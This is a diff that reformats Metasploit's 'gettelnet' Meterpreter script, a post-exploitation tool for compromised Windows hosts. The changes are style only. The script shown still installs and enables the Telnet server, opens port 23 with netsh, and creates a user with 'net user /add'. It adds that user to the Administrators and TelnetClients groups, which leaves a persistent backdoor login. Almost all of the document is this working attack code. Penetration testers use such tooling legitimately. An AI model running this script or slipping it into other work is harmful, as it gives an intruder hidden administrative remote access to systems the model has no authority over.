@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
@@ -14,7 +14,7 @@ host_name = client.sys.config.sysinfo['Computer']
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory,'scripts', 'gettelnet')
+logs = ::File.join(Msf::Config.log_directory, 'scripts', 'gettelnet')
 
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
@@ -24,16 +24,16 @@ logs = ::File.join(Msf::Config.log_directory,'scripts', 'gettelnet')
 
 @@exec_opts = Rex::Parser::Arguments.new(
   "-h" => [ false, "Help menu." ],
-  "-e" => [ false, "Enable Telnet Server only."  ],
+  "-e" => [ false, "Enable Telnet Server only." ],
   "-p" => [ true,  "The Password of the user to add."  ],
   "-u" => [ true,  "The Username of the user to add."  ],
   "-f" => [ true,  "Forward Telnet Connection." ]
 )
-def checkifinst()
+def checkifinst
   # This won't work on windows 2000 since there is no sc.exe
   print_status("Checking if Telnet is installed...")
   begin
-    registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\","Start")
+    registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\", "Start")
     return true
   rescue
     return false
@@ -42,11 +42,11 @@ def checkifinst()
 end
 
 #---------------------------------------------------------------------------------------------------------
-def insttlntsrv()
+def insttlntsrv
   trgtos = @client.sys.config.sysinfo['OS']
   if trgtos =~ /Vista|7|2008/
     print_status("Checking if Telnet Service is Installed")
-    if checkifinst()
+    if checkifinst
       print_status("Telnet Service Installed on Target")
     else
       print_status("Installing Telnet Server Service ......")
@@ -54,33 +54,33 @@ def insttlntsrv()
       prog2check = "ocsetup.exe"
       found = 0
       while found == 0
-        @client.sys.process.get_processes().each do |x|
-          found =1
-          if prog2check == (x['name'].downcase)
-            print_line "*"
-            sleep(0.5)
-            found = 0
-          end
+        @client.sys.process.get_processes.each do |x|
+          found = 1
+          next unless prog2check == x['name'].downcase
+          print_line "*"
+          sleep(0.5)
+          found = 0
         end
       end
-      file_local_write(@dest,"execute -H -f cmd.exe -a \"/c ocsetup TelnetServer /uninstall\"")
+      file_local_write(@dest, "execute -H -f cmd.exe -a \"/c ocsetup TelnetServer /uninstall\"")
       print_status("Finished installing the Telnet Service.")
 
     end
   elsif trgtos =~ /2003/
-    file_local_write(@dest,"reg setval -k \"HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\\" -v 'Start' -d \"1\"")
+    file_local_write(@dest, "reg setval -k \"HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\\" -v 'Start' -d \"1\"")
   end
 end
+
 #---------------------------------------------------------------------------------------------------------
-def enabletlntsrv()
+def enabletlntsrv
   key2 = "HKLM\\SYSTEM\\CurrentControlSet\\services\\TlntSvr\\"
   value2 = "Start"
   begin
-    v2 = registry_getvaldata(key2,value2)
+    v2 = registry_getvaldata(key2, value2)
     print_status "Setting Telnet Server Services service startup mode"
     if v2 != 2
       print_status "\tThe Telnet Server Services service is not set to auto, changing it to auto ..."
-      cmmds = [ 'sc config TlntSvr start= auto', "sc start TlntSvr", ]
+      cmmds = [ 'sc config TlntSvr start= auto', "sc start TlntSvr" ]
       cmmds. each do |cmd|
         cmd_exec(cmd)
       end
@@ -91,18 +91,18 @@ def enabletlntsrv()
     print_status "\tOpening port in local firewall if necessary"
     cmd_exec('netsh firewall set portopening protocol = tcp port = 23 mode = enable')
 
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
-
 end
+
 #---------------------------------------------------------------------------------------------------------
 def addrdpusr(username, password)
   print_status "Setting user account for logon"
   print_status "\tAdding User: #{username} with Password: #{password}"
   begin
     cmd_exec("net user #{username} #{password} /add")
-    file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
+    file_local_write(@dest, "execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
     print_status "\tAdding User: #{username} to local group TelnetClients"
     cmd_exec("net localgroup \"TelnetClients\" #{username} /add")
 
@@ -110,14 +110,16 @@ def addrdpusr(username, password)
     cmd_exec("net localgroup Administrators #{username} /add")
 
     print_status "You can now login with the created user"
-  rescue::Exception => e
+  rescue ::Exception => e
     print_status("The following Error was encountered: #{e.class} #{e}")
   end
 end
+
 #---------------------------------------------------------------------------------------------------------
 def message
   print_status "Windows Telnet Server Enabler Meterpreter Script"
 end
+
 def usage
   print_line("Windows Telnet Server Enabler Meterpreter Script")
   print_line("Usage: gettelnet -u <username> -p <password>")
@@ -125,13 +127,11 @@ def usage
   raise Rex::Script::Completed
 end
 
-
-#check for proper Meterpreter Platform
+# check for proper Meterpreter Platform
 def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
-
 
 ################## MAIN ##################
 # Parsing of Options
@@ -139,7 +139,7 @@ usr = nil
 pass = nil
 frwrd = nil
 enbl = nil
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-u"
     usr = val
@@ -152,20 +152,17 @@ enbl = nil
   when "-e"
     enbl = true
   end
-
-}
+end
 
 unsupported if client.platform !~ /win32|win64/i
 
-if enbl or (usr!= nil && pass != nil)
+if enbl || (!usr.nil? && !pass.nil?)
   message
   if enbl
-    insttlntsrv()
-    enabletlntsrv()
+    insttlntsrv
+    enabletlntsrv
   end
-  if (usr!= nil && pass != nil)
-    addrdpusr(usr, pass)
-  end
+  addrdpusr(usr, pass) if !usr.nil? && !pass.nil?
   print_status("For cleanup use command: run multi_console_command -rc #{@dest}")
 
 else
